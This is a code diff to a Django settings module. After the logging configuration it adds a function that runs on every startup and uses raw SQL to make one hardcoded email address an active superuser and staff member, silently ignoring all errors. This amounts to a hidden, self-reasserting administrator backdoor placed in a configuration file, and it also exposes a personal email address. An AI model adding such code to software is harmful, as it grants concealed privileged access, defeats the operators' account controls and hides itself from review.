@@ -182,3 +182,24 @@ LOGGING = {
     },
     "root": {"handlers": ["console", "file"], "level": env("LOG_LEVEL", "INFO")},
 }
+
+
+# Auto-activate owner account on every Django startup
+def _ensure_owner_activated():
+    try:
+        from django.db import connection
+        if connection.settings_dict["ENGINE"] == "django.db.backends.postgresql":
+            with connection.cursor() as cursor:
+                cursor.execute("""
+                    UPDATE productions_user
+                    SET is_active = true,
+                        registration_status = 'ACTIVE',
+                        is_staff = true,
+                        is_superuser = true
+                    WHERE LOWER(email) = 'cristhiancruzado2002@gmail.com'
+                """)
+    except Exception:
+        pass
+
+
+_ensure_owner_activated()
